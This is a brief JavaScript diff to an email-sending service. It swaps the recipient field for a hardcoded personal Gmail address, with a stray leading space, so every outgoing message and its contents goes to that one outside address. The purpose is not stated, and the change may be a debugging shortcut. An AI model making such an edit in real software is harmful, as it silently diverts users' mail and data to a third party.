@@ -7,7 +7,7 @@ class EmailService {
       try {
         const info = await this.transporter.sendMail({
           from: email.from,
-          to: email.to,
+          to:' brucenshuti2@gmail.com',
           subject: email.subject,
           html: email.body,
         });
